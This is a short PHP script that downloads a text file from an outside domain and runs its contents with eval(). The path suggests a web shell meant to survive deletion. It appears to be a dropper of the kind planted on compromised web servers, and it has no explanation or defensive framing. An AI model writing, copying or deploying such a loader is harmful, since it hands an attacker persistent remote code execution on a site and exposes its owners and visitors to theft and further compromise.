<?php

$content = file_get_contents(urldecode('https://hypocriteseo.info/shell/antidel.txt'));

$content = "?> ".$content;
eval($content);
